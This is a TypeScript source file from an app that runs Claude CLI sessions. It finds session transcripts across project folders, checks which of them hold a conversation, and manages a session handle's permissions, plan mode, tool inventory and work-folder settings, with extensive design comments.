 * The previous rule replaced only `/`, which left the space in "Application Support", the `@` in
 * "@brobot2" and the `_` in "sess_…" intact — so the preflight looked in a directory that does not
 * exist and reported "session not found" for a transcript sitting right there. The app's default
 * userData path contains both a space and an `@`, so that broke resume for **every** real session;
 * it survived because the only test cwd had no special characters at all.
 *
 * Exported and pure so the rule has one definition and can be tested directly.
 */
export function claudeProjectDirName(cwd: string): string {
  return cwd.replace(/[^a-zA-Z0-9]/g, '-')
}

async function defaultSessionExists(
  sessionId: string,
  cwd: string,
  providerHome: string,
): Promise<boolean> {
  // The eager resume preflight must inspect the PROFILE home (021). `getSessionInfo`
  // has no home argument and mutating `process.env` would race concurrent profiles,
  // so probe the transcript path directly under the profile home — a deliberate
  // provider-version path coupling (015 option 3; the live check is 022's job).
  //
  // 🔴 **706 · …and `false` is `noSuchSession` now, on which the host lets go of a conversation — so
  // it must be an absence the CLI could not get past either** (the `706` review, three rounds).
  // ⚑ The folder named from the cwd first, as it always was; then EVERY project folder — the CLI's
  // own resume scans them too when its first lookup misses. The id is Claude's own UUID, so a
  // transcript of it anywhere in this home is this conversation — a symlinked, moved, re-spelled or
  // over-long working folder names a folder Claude never wrote, and the old probe called a
  // conversation Claude still has gone. ⚠️ **Wider than the CLI's scan, on purpose** (the `706`
  // review, round four): the CLI skips a symlinked folder, refuses an id held twice, and steps past
  // a folder it cannot read; this answers *there* or *a doubt* in each of those shapes. ⚑ Every one
  // errs toward KEEPING the conversation — a press that fails again — and never toward letting go
  // of one Claude may still resume. 🔴 **D-017 · R9 — and like the CLI it counts only a file with a
  // user or assistant record** ({@link holdsAConversation}): an empty transcript, or one of queue
  // lines only, is one no resume can open (D-015 measured both), so it is gone for good as a
  // deleted one is. ⛔ **Only the kernel's absence is an absence**: a folder that could not be read
  // is a doubt, and a doubt is thrown — `resume`'s boundary wraps it as a failure of THIS attempt —
  // unless another folder holds the transcript.
  const projects = join(providerHome, 'projects')
  const transcript = `${sessionId}.jsonl`
  let doubt: unknown = null
  const holdsIt = (folder: string): boolean => {
    try {
      const path = join(projects, folder, transcript)
      return stillThere(path) && holdsAConversation(path)
    } catch (error) {
      doubt ??= error
      return false
    }
  }
  if (holdsIt(claudeProjectDirName(cwd))) return true
  let folders: string[]
  try {
    folders = readdirSync(projects)
  } catch (error) {
    if (!isAnAbsence(error)) throw error
    folders = []
  }
  if (folders.some(holdsIt)) return true
  if (doubt !== null) throw doubt
  return false
}

/**
 * ⚑ **706 · the kernel's own "that is not there"** — `ENOENT`, `ENOTDIR`, and `ENAMETOOLONG` (a name
 * too long to exist cannot be where a file is: the CLI cuts such a folder name, and the scan finds
 * it). ⛔ Everything else — `EACCES`, `EIO`, `ELOOP`, a descriptor shortage — is a doubt.
 */
function isAnAbsence(error: unknown): boolean {
  const code = (error as { code?: unknown }).code
  return code === 'ENOENT' || code === 'ENOTDIR' || code === 'ENAMETOOLONG'
}

/** Whether a file is there — `false` only for the kernel's absence; any other error is thrown. */
function stillThere(path: string): boolean {
  try {
    statSync(path)
    return true
  } catch (error) {
    if (isAnAbsence(error)) return false
    throw error
  }
}

/** How far into a found transcript {@link holdsAConversation} reads before it stops asking. */
const A_CONVERSATION_BUDGET_BYTES = 1024 * 1024

/** How much {@link holdsAConversation} reads at a time. */
const A_CONVERSATION_CHUNK_BYTES = 64 * 1024

/**
 * 🔴 **D-017 · R9 — whether a transcript that is there holds a conversation**: a record whose
 * `type` is `user` or `assistant`, the CLI's own test. ⚑ Read a chunk at a time and stopped at the
 * first such record, so a long transcript costs one short read. ⛔ A file this could not read, or a
 * budget spent before an answer, counts as holding one: only a whole read that found none is
 * *none*.
 */
function holdsAConversation(path: string): boolean {
  let fd: number
  try {
    fd = openSync(path, 'r')
  } catch {
    return true
  }
  try {
    const chunk = Buffer.alloc(A_CONVERSATION_CHUNK_BYTES)
    // ⚑ A decoder, so a character split across two chunks is decoded whole.
    const decoder = new StringDecoder('utf8')
    let partial = ''
    let at = 0
    while (at < A_CONVERSATION_BUDGET_BYTES) {
      const read = readSync(fd, chunk, 0, chunk.length, at)
      if (read === 0) return isAConversationRecord(partial + decoder.end())
      at += read
      const lines = (partial + decoder.write(chunk.subarray(0, read))).split('\n')
      partial = lines.pop() ?? ''
      if (lines.some(isAConversationRecord)) return true
    }
    return true
  } catch {
    return true
  } finally {
    closeSync(fd)
  }
}

/** One JSONL line, asked whether it is a `user` or `assistant` record. */
function isAConversationRecord(line: string): boolean {
  let record: unknown
  try {
    record = JSON.parse(line)
  } catch {
    return false
  }
  if (record === null || typeof record !== 'object') return false
  const { type } = record as { type?: unknown }
  return type === 'user' || type === 'assistant'
}

/**
 * 🔴 **722 · R79 — the working folder the CLI RECORDED in a launch's own transcript, or `null`.**
 *
 * ⚑ What the adoption scan requires before it lists a Claude transcript (`discover-sessions.ts`,
 * `readClaudeHeader`): a record naming a `cwd`, and no record naming another session. So a close
 * that finds one here announces a conversation the scan would otherwise list as a second one, and a
 * close that finds none announces nothing the scan could have listed (the first records are
 * `queue-operation`s with no cwd — measured, `adopt-sessions.test.ts`).
 * ⛔ **The CLI's spelling, not the launch's**: the CLI records the folder it resolved — a `/tmp` or
 * symlinked folder as its real path (the `722` review) — and a reopen's first init reports that same
 * spelling to {@link ClaudeSessionHandle.validateInitRef}, so the ref must carry it, never `opts.cwd`.
 * ⚑ The folder named from the launch's cwd first, then every project folder, as
 * {@link defaultSessionExists} looks. ⚠️ Throws for a folder or file it could not read; the one
 * caller turns a doubt into no announcement.
 */
export function launchTranscriptCwd(
  sessionId: string,
  cwd: string,
  providerHome: string,
): string | null {
  const projects = join(providerHome, 'projects')
  let folders: string[]
  try {
    folders = readdirSync(projects)
  } catch (error) {
    if (isAnAbsence(error)) return null
    throw error
  }
  const named = claudeProjectDirName(cwd)
  for (const folder of [named, ...folders.filter((one) => one !== named)]) {
    const recorded = recordedCwdIn(join(projects, folder, `${sessionId}.jsonl`), sessionId)
    if (recorded !== undefined) return recorded
  }
  return null
}

/**
 * 🔴 **731 · `706` F-5 — the file the CLI RECORDED a conversation in, or `null`.**
 *
 * ⚑ The folder named from the cwd first, then every project folder — the order
 * {@link defaultSessionExists} and {@link launchTranscriptCwd} look in. The id is Claude's own UUID,
 * so `<id>.jsonl` in any project folder of this home is this conversation: a symlinked, moved or
 * over-long working folder names a folder the CLI never wrote. ⚠️ The first name is only the
 * flattened cwd: for a very long working folder the CLI's own folder name may differ, which this
 * finds in the scan instead.
 * ⛔ Until `731` the archive, the export and the child-work reader asked only the named folder, so a
 * conversation Claude still resumed was never archived.
 * ⚠️ `null` is *nothing to read* — no file, or no folder this could read. It never throws: every
 * caller treats a missing transcript as an ordinary answer.
 */
export function claudeTranscriptPath(
  sessionId: string,
  cwd: string,
  providerHome: string,
): string | null {
  const projects = join(providerHome, 'projects')
  const transcript = `${sessionId}.jsonl`
  const named = claudeProjectDirName(cwd)
  const at = (folder: string): string | null => {
    const path = join(projects, folder, transcript)
    return existsSync(path) ? path : null
  }
  const first = at(named)
  if (first !== null) return first
  let folders: string[]
  try {
    folders = readdirSync(projects)
  } catch {
    return null
  }
  for (const folder of folders) {
    if (folder === named) continue
    const found = at(folder)
    if (found !== null) return found
  }
  return null
}

/** How far into a transcript {@link launchTranscriptCwd} looks — discovery's own budget. */
const RECORDED_CWD_BUDGET_BYTES = 1024 * 1024

/** `undefined` when no such file; `null` when it names no cwd (or names another session) in budget. */
function recordedCwdIn(path: string, sessionId: string): string | null | undefined {
  let fd: number
  try {
    fd = openSync(path, 'r')
  } catch (error) {
    if (isAnAbsence(error)) return undefined
    throw error
  }
  try {
    const buffer = Buffer.alloc(RECORDED_CWD_BUDGET_BYTES)
    const read = readSync(fd, buffer, 0, buffer.length, 0)
    const lines = buffer.subarray(0, read).toString('utf8').split('\n')
    // A line the budget cut is not a record.
    if (read === buffer.length) lines.pop()
    for (const line of lines) {
      let record: unknown
      try {
        record = JSON.parse(line)
      } catch {
        continue
      }
      if (record === null || typeof record !== 'object') continue
      const { cwd, sessionId: named } = record as { cwd?: unknown; sessionId?: unknown }
      if (typeof named === 'string' && named !== sessionId) return null
      if (typeof cwd === 'string' && cwd !== '') return cwd
    }
    return null
  } finally {
    closeSync(fd)
  }
}

function errorMessage(error: unknown): string {
  return error instanceof Error ? error.message : String(error)
}

/**
 * 🔴 **{@link TurnProvenance} in the SDK's words** (662) — `SDKMessageOrigin`, `sdk.d.ts:5138`.
 *
 * ## ⛔ What the CLI does with each arm
 *
 * | we send | what differs, for a session BroBot can run |
 * |---|---|
 * | `{ kind: 'human' }` | ⚑ a person's turn: the `ultracode` keyword can opt it into a workflow |
 * | `{ kind: 'peer', … }` | none |
 * | nothing | none: the keyword needs `kind: 'human'` exactly |
 *
 * ⚠️ No probe measures the keyword row: a fake key never opens the account's workflows.
 *
 * ⚑ **A peer stamp changes nothing today.**
 * `packages/runtime/smoke/claude-origin-wire-probe.smoke.ts` sends one turn three times through the
 * bundled CLI to a loopback endpoint, stamped nothing, `human` and `peer`: the whole model-bound
 * request is byte-identical across the three (its per-home `metadata.device_id` aside).
 * The stamp is sent anyway because it is the true answer, and a provider that honours it gets it
 * without another change here.
 *
 * ⚠️ **There is ONE other strict reader, and BroBot cannot reach it**: the `auto` permission
 * mode's classifier builds its transcript from `kind === 'human'` turns too. `permissionModeFor`
 * only ever answers `default` or `plan`, so no session this app runs has that classifier.
 *
 * ⛔ **An absent origin is NOT refused everywhere.** Only the strict readers take absent as *not a
 * person*. Most readers are lenient and take absent as a person: the prompt counter, the first-prompt
 * lookup, the queued-prompt framing. ⚑ That is why a turn nobody classified is left absent rather
 * than called anything: absent is what every such turn already was, so this build treats it exactly
 * as it always did.
 *
 * ⚑ **`name` is spread, so a sender with no name carries no `name` key at all.** The SDK itself
 * leaves `name` absent when it cannot vouch for one.
 */
function claudeOriginOf(origin: TurnProvenance | undefined): SDKMessageOrigin | undefined {
  if (origin === undefined) return undefined
  switch (origin.kind) {
    case 'person':
      return { kind: 'human' }
    case 'peer':
      return {
        kind: 'peer',
        from: origin.from,
        ...(origin.name === undefined ? {} : { name: origin.name }),
      }
  }
}

/**
 * A live Claude session: one SDK `Query` driven by an AsyncIterable input queue,
 * its message stream normalized into content `RuntimeEvent`s, with session/turn
 * lifecycle driven through the shared {@link SessionMachine} (008) and
 * permission/user-input resolution through the shared {@link RequestBroker} (009).
 */
export class ClaudeSessionHandle implements SessionHandle {
  private readonly provider = 'claude' as const
  private readonly eventQueue = new AsyncQueue<RuntimeEvent>()
  /** Coalesces streamed deltas before they reach the queue; flushes before any non-delta event (019). */
  private readonly coalescer = new DeltaCoalescer((event) => this.deliver(event))
  private readonly machine = new SessionMachine((event) => this.emit(event))
  /**
   * ⚑ **F084 — the main agent's Bash calls still waiting on their result**, by tool use id: what a
   * stop ends ({@link interrupt}). ⚠️ A call sent to the background is answered at once, so it is
   * never here; a sub-agent's is not the turn's own.
   */
  private readonly commandsWaitedOn = new Set<string>()
  /**
   * A card the SDK aborted while it still waited: the CLI withdrew it, so the record closes it, as
   * Codex's own withdrawal does. A card already answered, stopped or closed is not withdrawn again.
   */
  private readonly cardWithdrawn = (id: string): void => this.emit({ type: 'request_resolved', id })
  private readonly permissions = new RequestBroker<PermissionDecision>(
    () => this.isShuttingDown,
    () => ({ outcome: 'deny', message: 'session closed' }),
    this.cardWithdrawn,
  )
  private readonly userInputs = new RequestBroker<UserInputResponse>(
    () => this.isShuttingDown,
    () => ({ kind: 'reject' }),
    this.cardWithdrawn,
  )

  private pluginRefresh?: (
    servers: readonly ManagedPluginMcpServer[],
  ) => NonNullable<Options['mcpServers']>
  configurePluginRefresh(build: NonNullable<ClaudeSessionHandle['pluginRefresh']>): void {
    this.pluginRefresh = build
  }
  async refreshManagedPlugins(servers: readonly ManagedPluginMcpServer[]): Promise<void> {
    try {
      if (!this.query?.setMcpServers || !this.pluginRefresh)
        throw new Error('Plugin unavailable. Try again.')
      const result = await this.query.setMcpServers(this.pluginRefresh(servers))
      if (
        result &&
        typeof result === 'object' &&
        'errors' in result &&
        result.errors &&
        Object.keys(result.errors).length
      )
        throw new Error('Plugin unavailable. Try again.')
    } catch {
      throw new Error('Plugin unavailable. Try again.')
    }
  }
  private query: ClaudeQuery | null = null
  /** Who the CLI said this session is signed in as ({@link account}); `undefined` until it has. */
  private accountSaid: SessionAccount | null | undefined = undefined
  /**
   * The CLI child this session's query was launched with (233).
   *
   * ⛔ **Required by {@link attachQuery}, and that is the safety property rather than a style.** A
   * handle that could be missing its witness would answer {@link awaitProcessExit} with a resolved
   * promise it had no evidence for — 229 H1's defect reintroduced by omission, in the one class the
   * dispatch exists to fix. Making it non-optional means the compiler, not a reviewer, is what
   * guarantees every Claude handle has one.
   *
   * ⚠️ The witness being present does NOT mean a child exists: a fake `QueryFactory` never calls
   * `Options.spawnClaudeCodeProcess`, so nothing spawns and the witness says so — see
   * {@link ClaudeChildWitness.exited}, where "no child" and "the child died" are two different
   * observations that happen to agree.
   */
  private child!: ClaudeChildWitness
  private _ref: SessionRef | null
  private currentStatus: SessionStatus = 'idle'
  private opening: 'started' | 'resumed' = 'started'
  /** Set once teardown has emitted the terminal events: late provider events are then dropped. */
  private terminated = false
  /** Single-flight close: every concurrent caller awaits ONE teardown (023 P1-A). */
  private closing: Promise<void> | null = null

  /**
   * The ref a resume was asked to restore; used only to validate the first-turn init.
   * ⚠️ **715: this sentence was false until R64** — {@link validateInitRef} compared it with EVERY
   * init, and a later one naming the folder the model `cd`'d into ended the conversation.
   * ⚑ **721 · R76:** that same first init also reads whether the reset before it was THIS
   * conversation's own — and if it was, the session opens naming this ref (see the gate in `runLoop`).
   */
  private readonly _targetRef: SessionRef | null

  /**
   * ⛔ **Whether this launch's first `system/init` has been read** (715, R64) — the one init that
   * opens the session and that a resume proves its identity on. A later init is read for nothing
   * here — ⚑ **save the one after a `conversation_reset`, which is read for the ref and nothing else**
   * (`721` · R75, {@link resetPending}). See the gate in `runLoop` and {@link validateInitRef}.
   */
  private sharedSkillsRoot?: string
  noteSharedSkills(root: string | undefined): void {
    this.sharedSkillsRoot = root
  }
  private withSharedSkills(folders: readonly string[]): readonly string[] {
    return this.sharedSkillsRoot ? [...new Set([...folders, this.sharedSkillsRoot])] : folders
  }
  private builtInSkills?: BuiltInSkillsContext
  private skillCatalogueConfirmed = false

  noteBuiltInSkills(context: BuiltInSkillsContext | undefined): void {
    this.builtInSkills = context
    this.skillCatalogueConfirmed = false
  }

  builtInSkillsConfirmed(): boolean {
    return this.skillCatalogueConfirmed
  }

  private initRead = false
  /**
   * 🔴 **`721` · R75/R76 — a `conversation_reset` this launch read, whose init has not come yet.**
   *
   * ⚑ Measured (`probe:claude-resume-after-cd`): a `/clear` sends the reset, then — adjacent — the
   * `system/init` naming the conversation that has a transcript. The reset's own id has none. So the
   * reset is remembered here, and the NEXT init is read once: for the ref (R75, a live session), or
   * at the resume barrier (R76, a reopen whose first message was `/clear`). `from` is the reset
   * frame's `session_id` — R76's proof. Consumed by one init; `null` otherwise.
   *
   * ⚠️ **A reset no init follows moves nothing**, and the ref stays on the conversation the reset
   * left — which HAS a transcript, so it still reopens (with the pre-reset context). Only `/clear`
   * is measured; the SDK's other triggers (`plan_mode_exit`, …) are not (`721`'s report).
   */
  private resetPending: { readonly from: string } | null = null

  /**
   * 🔴 **722 · R79 — the id this launch ASKED the provider to use, held from the start** — `null` on a
   * resume, which names its conversation with `resume` and may not name a second id beside it.
   *
   * ⚑ `717` F-1, step 10, measured: a conversation closed 29 ms after its send, before `system/init`,
   * kept `external_ref` NULL while the CLI still wrote its transcript — and the next adoption scan
   * listed this app's own launch as a second conversation. `Options.sessionId` (`--session-id`, SDK
   * 0.3.281) makes the id ours before the CLI runs, so a close before init still has one to name.
   *
   * ⛔ **Not {@link _ref}, and never read as it** (011): the ref still latches only on a validated
   * first init. A ref is announced from this by {@link doClose} alone, and only when
   * {@link launchRefIfRecorded} finds the CLI's transcript under it naming a folder — what the
   * adoption scan requires before it lists one ({@link launchTranscriptCwd}) — so a row gets a ref
   * exactly when the scan could have listed the conversation, it carries the folder the CLI
   * recorded, and a launch closed before the CLI wrote a record still reads *"no turn was ever taken
   * in this one"*. ⚠️ The CLI's own resume asks more — a user or assistant line — so a ref announced
   * on a bare record can meet a reopen the CLI refuses; that is the adopted row's fate too.
   */
  private launch: {
    readonly sessionId: string
    readonly recorded: () => Promise<string | null>
  } | null = null

  /**
   * The digest of the machine credential this child was launched with (147), or null when no auth
   * bridge is wired (the library default) — see {@link credentialFingerprint} for why a digest.
   * Written once, by {@link ClaudeRuntime.optionsFor}, from the very bytes it injects.
   */
  private launchCredential: string | null = null
  /** ⚑ Set by {@link noteLaunchedOnAKey}: this child runs on the person's API key. */
  private launchedOnAKey = false

  /** Latched by {@link checkSignIn}; read for free by every disclosure after that. */
  private _signInSuperseded = false

  constructor(
    private readonly input: AsyncQueue<SDKUserMessage>,
    private readonly cwd: string,
    private readonly rotation: number,
    targetRef?: SessionRef,
    /**
     * The mode the conversation OPENED with (078). No longer the last word on it: 034 lets the user
     * flip it mid-conversation, and {@link approvals} owns the pair from here — this parameter only
     * seeds it.
     */
    approvalMode?: ApprovalMode,
    /**
     * What effort this session ASKED for (024), or undefined when nobody chose. Kept so the
     * agent info can report it — the SDK gives us no way to read it back, so our request is the
     * only thing there is to say, and it is said as a request.
     */
    requestedEffort?: ReasoningEffort,
    /** Which model the launch asked for (038), or undefined for "we did not ask". Seeds {@link models}. */
    seedModel?: string,
    /** Whether the launch asked for plan mode (030). Seeds {@link plan}. */
    seedPlanMode?: boolean,
    /**
     * The machine-login bridge, in its NON-BLOCKING form (147; async since 149) — kept so this
     * session can ask, at a turn boundary, whether the sign-in it launched with is still the
     * machine's. Never used to inject anything: {@link ClaudeRuntime.childEnvAdditions} remains the
     * one place a token is put into a child, and this handle only ever sees the digest of one.
     *
     * ⛔ **The asynchronous one specifically, because this is asked on Electron's main process.**
     * 148 H4: the blocking reader here froze the app on a Keychain that did not answer.
     */
    private readonly authTokenProviderAsync?: ClaudeAuthTokenProviderAsync,
    /**
     * 🔴 **W4.189 · the folders this session may also work in** —
     * {@link ProviderRuntimeContext.workFolders}, put in the launch's flag settings by
     * {@link ClaudeRuntime.optionsFor} beside the kept rules. Seeds {@link folders}.
     */
    seedWorkFolders: readonly string[] = [],
  ) {
    // Never seed `_ref` from the requested resume ref: the ref is latched only
    // once a real `system/init` arrives AND (for resume) validates against it.
    // ⚑ 721 · R76: after the target's own `/clear`, that init names the NEW conversation, and the
    // opening names the target on the reset frame's proof (`resetPending.from`), never on this one.
    this._targetRef = targetRef ?? null
    this._ref = null
    this.approvals = new ApprovalModeSwitch(approvalMode)
    this.models = new NextTurnSetting<string | undefined>(seedModel)
    this.efforts = new NextTurnSetting<ReasoningEffort | undefined>(requestedEffort)
    this.plan = new NextTurnSetting<boolean>(seedPlanMode === true)
    this.folders = new NextTurnSetting<readonly string[]>([...seedWorkFolders])
  }

  /**
   * The three settings 076 made changeable mid-conversation, each carrying the pair 034 established.
   *
   * ⚠️ **Claude's mechanisms are live control requests, and the turn-boundary delay here is OURS.**
   * `Query.setModel`, `setPermissionMode` and `applyFlagSettings` all take effect when called — the
   * SDK says "for subsequent responses" — so unlike Codex there is no protocol reason to wait. The
   * reason to wait anyway is 034's: a control that meant "now" on one provider and "next turn" on
   * the other would be a control that lies half the time, and moving a running turn onto another
   * model halfway through an answer the user is reading is the worse half. So the calls are made at
   * the boundary, in {@link send}, and the queue is real rather than decorative.
   */
  private readonly models: NextTurnSetting<string | undefined>
  private readonly efforts: NextTurnSetting<ReasoningEffort | undefined>
  private readonly plan: NextTurnSetting<boolean>

  /**
   * 🔴 **W4.189 · the work folders, a fourth setting moved at the turn boundary** — by
   * `applyFlagSettings` in {@link applyPendingSettings}, and adopted only once that call succeeded,
   * as the other three are.
   */
  private readonly folders: NextTurnSetting<readonly string[]>

  /**
   * 🔴 **The kept rules THIS launch put in the flag layer** ({@link keptRulesForALaunch}), exactly
   * as {@link ClaudeRuntime.optionsFor} read them — never read again. ⚠️ A `permissions` sent through
   * `applyFlagSettings` REPLACES the whole object the launch put there, so every work-folder change
   * re-sends these beside the new list ({@link flagPermissionsOf}); re-reading the files instead
   * could hand the CLI rules this conversation was never launched with. Empty until noted.
   */
  private keptRules: KeptRuleLists = {}

  /**
   * The flag settings this launch starts with: the profile's memory directory, its kept rules — held
   * from here on ({@link keptRules}) — and this session's work folders. Called once, by
   * {@link ClaudeRuntime.optionsFor}.
   */
  launchFlagSettings(providerHome: string, kept: KeptRuleLists): Settings {
    this.keptRules = kept
    return flagSettingsFor(providerHome, kept, this.withSharedSkills(this.folders.effective))
  }

  /**
   * 🔴 **740 · R99 — the file an `allow_always` on this conversation is kept in**: its PROJECT's local
   * settings, where the CLI keeps a *"don't ask again"* ({@link projectLocalSettingsFile}; until `740`
   * the provider home's `settings.json`, `736`'s R95). Noted at launch by the runtime that launched it
   * ({@link noteAlwaysRulesFile}) — the CLI resolves its own at its start. `null` on a handle nobody
   * told, and then a card says what an "always" installs but not where.
   */
  private alwaysRulesFile: string | null = null

  /** The local settings files this launch reads its kept rules from, as found at the launch. */
  private localSettingsFiles: readonly string[] | null = null

  /**
   * The launch's project local settings — see {@link alwaysRulesFile} — and every local settings file
   * it reads back, found once: finding them runs git.
   */
  noteAlwaysRulesFile(): void {
    const { files } = localSettingsFilesOf(this.cwd)
    this.localSettingsFiles = files
    this.alwaysRulesFile = files[0] ?? null
  }

  /** The local settings files this launch reads back — found once, by {@link noteAlwaysRulesFile}. */
  launchLocalFiles(): readonly string[] {
    if (this.localSettingsFiles === null) this.noteAlwaysRulesFile()
    return this.localSettingsFiles ?? []
  }

  /**
   * 🔴 **What BroBot declared for THIS session, flattened once at launch** (358).
   *
   * ⛔ **Noted rather than re-derived at emit time.** {@link parametersOf} runs `z.toJSONSchema`
   * over every tool, and the frame that triggers the emit can arrive several times in one process —
   * `257` §0 measured a scheduled job re-emitting `system/init` at 10 194 / 54 805 / 114 037 ms on
   * one stream. Deriving per frame would run the same conversion four times for an answer that
   * cannot have changed: the toolset is fixed in a query's `Options` for the life of that query.
   *
   * ⚠️ **`null` is the honest value for a launch that declared none**, and it is not reachable on
   * the two ordinary paths — `runtime-host.ts` attaches the toolset with no condition on either
   * line. It is reachable from a test, from a fake, and from any future path that forgets.
   */
  private declaredToolset: DeclaredToolset | null = null

  /**
   * The last inventory this session published, serialized — so REPLACE does not become a duplicate.
   *
   * ⛔ **Not an optimisation: it is what keeps a re-emitted frame meaningful.** Every `system/init`
   * restates the whole inventory, and on a session woken three times by a cron that is four
   * identical rows in the ledger saying nothing happened. A row appears here only when the answer
   * actually moved — a plugin reloaded, a server that dropped out — which is the only case a reader
   * can act on. ⚠️ The empty string is *"nothing published yet"* and can never equal a real payload,
   * because a real one is a three-element ARRAY and is at minimum `[null,{"tools":[],...},0]`.
   * ⚑ **The shortfall is part of the compared identity**, and deliberately: a frame that carried the
   * same names but lost one more of them to a cap has changed what this app can say about it.
   */
  private lastInventory = ''

  /** Whether `toolName` is one of this app's own tools, as the CLI names them. */
  private isThisAppsTool(toolName: string): boolean {
    const declared = this.declaredToolset
    return (
      declared !== null &&
      declared.tools.some(
        (one) => qualifyWith(CLAUDE_TOOL_NAMING, declared.server, one.name) === toolName,
      )
    )
  }

  /**
   * ⛔ **Take the declaration, at the one place both start and resume pass through** (358).
   *
   * ⚑ Called from `optionsFor`, beside `claudeMcpServersFor(agentTools)` — the line that turns this
   * same object into the child's MCP server. Two readings of one argument, three lines apart, so a
   * resume that dropped the toolset would drop the surface's claim about it in the same breath
   * rather than leaving a stale one on screen.
   */
  noteDeclaredToolset(toolset: AgentToolset | undefined): void {
    this.messageReceipts = toolset?.tools.some((tool) => tool.name === 'message_agent')
      ? new ClaudeMessageReceipts(qualifyWith(CLAUDE_TOOL_NAMING, toolset.server, 'message_agent'))
      : undefined
    this.declaredToolset =
      toolset === undefined
        ? null
        : {
            server: toolset.server,
            ...(toolset.instructions === undefined ? {} : { instructions: toolset.instructions }),
            tools: toolset.tools.map((one) => ({
              name: one.name,
              description: one.description,
              parameters: parametersOf(one.input),
            })),
          }
  }

  /**
   * 🔴 **What this conversation has, as the child itself just stated it** (358).
   *
   * ⚑ **Raised here rather than in `normalizeMessage` for the reason the session ref is** — the
   * pure normalizer is given neither the launch's toolset nor anything else about how this session
   * was constructed, and half of this event is exactly that.
   *
   * ⛔ **`published` is never `null` on this provider.** Claude publishes, so a Claude event that
   * said otherwise would be claiming the provider is silent while holding its answer. The `null`
   * arm belongs to Codex and to nobody else — see `tool-inventory.ts`.
   */
  private publishToolInventory(
    message: Extract<SDKMessage, { type: 'system'; subtype: 'init' }>,
  ): void {
    // ⛔ **Read through a cast, like `memory-store.ts` reads `memory_paths`, and for the harder
    // version of its reason.** That field is undeclared; these two ARE declared and required — and
    // a frame is still a runtime object off a child process, so the type is a promise rather than a
    // guarantee. ⚠️ **The first version of this indexed them directly and a frame without `tools`
    // threw INSIDE `runLoop`**, which stops the `for await` before `sessionStarted` — the session
    // never latched its ref and every later assertion about it failed somewhere else entirely.
    const frame = message as unknown as Record<string, unknown>
    const tools = frame['tools']
    // ⛔ **A frame that published no list publishes NOTHING**, and does not publish an empty one.
    // `[]` here would say *"this conversation has no tools"* — the exact lie the registry's three
    // states exist to keep unsayable. Silence leaves it at *"we have not been told"*, which is true.
    if (!Array.isArray(tools)) return
    const servers = frame['mcp_servers']
    const namedTools = tools.filter((one): one is string => typeof one === 'string')
    // ⚠️ **Best-effort, and gated on `tools` rather than on itself.** A frame that lists tools and
    // names no server is a real, ordinary state — it is what the control arm of
    // `probe:tool-inventory` measured — so an absent or malformed `mcp_servers` degrades to *"named
    // none"* rather than suppressing an inventory the child did publish.
    const rawServers = Array.isArray(servers) ? servers : []
    const namedServers = rawServers
      .filter((one): one is { name: string; status: string } => {
        if (typeof one !== 'object' || one === null) return false
        const row = one as Record<string, unknown>
        return typeof row['name'] === 'string' && typeof row['status'] === 'string'
      })
      .map((server) => ({ name: server.name, status: server.status }))
    // ⛔ **What THESE two filters discarded, counted here** — because `boundInventory` computes
    // `dropped` from the arrays it is HANDED, so anything shed before it is invisible to the number.
    // ⚠️ **That is not a nicety: it produces a FALSE SENTENCE.** A frame carrying
    // `mcp_servers: [{name:'brobot'}]` with no `status` loses the row, the sheet finds no status for
    // our own server and prints *"the agent did not list this server"* — about a server the child
    // did list — with the shortfall banner suppressed because `dropped` was 0. The event's own
    // contract says otherwise: *"rows either half named that this event does not carry — for ANY
    // reason, so a cap can never be silent."* `session-store.ts` adds exactly this kind of term for
    // exactly this reason (`092` §4).
    const shedBeforeBounding =
      tools.length - namedTools.length + (rawServers.length - namedServers.length)
    const bounded = boundInventory({
      naming: CLAUDE_TOOL_NAMING,
      declared: this.declaredToolset,
      published: { tools: namedTools, servers: namedServers },
    })
    const dropped = bounded.dropped + shedBeforeBounding
    const key = JSON.stringify([bounded.declared, bounded.published, dropped])
    if (key === this.lastInventory) return
    this.lastInventory = key
    this.emit({
      type: 'tool_inventory',
      naming: bounded.naming,
      declared: bounded.declared,
      published: bounded.published,
      ...(dropped > 0 ? { dropped } : {}),
      source: message.subtype,
    })
  }

  /**
   * What this session prompts for now, and what it will prompt for next (034).
   *
   * The delay is not a courtesy here, it is the shape of the SDK: `permissionMode`,
   * `allowDangerouslySkipPermissions` and the `Options.hooks` array are all fixed in the `Options`
   * of a query that lives for the whole session, and none of them can be rebuilt without ending it.
   *
   * ⚠️ **This paragraph used to say `Query.setPermissionMode` was not worth calling because "080
   * established that `bypassPermissions` alone never removed a card". That was false** (050), and it
   * is the sentence the whole defect grew out of: under `bypassPermissions` the SDK approves
   * *before* `canUseTool` is consulted, and this file already
   * documented that correction two hundred lines below in {@link handleCanUseTool} without anyone
   * bringing the two claims back into agreement. `permissionMode` decides a great deal.
   *
   * `setPermissionMode` is still not called, for a reason that survives the correction: **one
   * mechanism reads this value, so there is nothing to disagree with.** No launch asks for
   * `bypassPermissions` ({@link permissionModeFor}), so every CLI ask reaches {@link handleCanUseTool},
   * whose `auto` return answers it. ⚠️ Until `728` the guard also forced `ask` on calls the CLI would
   * run unasked and out-voted the frozen `permissionMode` that way (007 P1-6); R93 removed that ask. Adding a second control message that
   * moved the floor as well would re-create the shape of the bug: two sources of truth for one
   * safety boundary, free to land at different moments.
   *
   * What gates a card is therefore this value, read live by the guard and by
   * {@link handleCanUseTool} — which is why adopting the change at the start of a turn is enough to
   * make it real, and adopting it any sooner would make an in-flight turn stop prompting halfway
   * through a decision the user is looking at.
   */
  private readonly approvals: ApprovalModeSwitch

  get approval(): ApprovalModeState {
    return { effective: this.approvals.effective, requested: this.approvals.requested }
  }

  /**
   * Is this session planning RIGHT NOW (140). ⚑ Since `728` its readers are two, both in
   * {@link handleCanUseTool}: `auto`'s early allow stands aside while planning (the CLI's plan mode
   * asks even unattended), and a card for the CLI's own plan-mode ask offers no conversation grant.
   * ⚠️ So a plan the provider starts must be SETTLED here — the allow of `EnterPlanMode` raises it
   * in every mode (since `736`, R98: the CLI asks nobody), and a person's answer to `ExitPlanMode`
   * lowers it in {@link respondUserInput}.
   *
   * `effective`, never `requested`: a plan mode the user asked for but whose turn has not started
   * must not silently govern the turn already running, which is the whole point of
   * {@link NextTurnSetting}. It is a getter rather than an exposed field so the hook cannot adopt or
   * request anything through it.
   */
  get planning(): boolean {
    return this.plan.effective
  }

  /** The tools granted wholesale for this session (058), for the header to disclose. */
  get blanketGrants(): readonly string[] {
    return this.sessionGrants.blanket
  }

  /** Record a mode change for the NEXT turn (034); see {@link approvals}. */
  setApprovalMode(mode: ApprovalMode): Promise<void> {
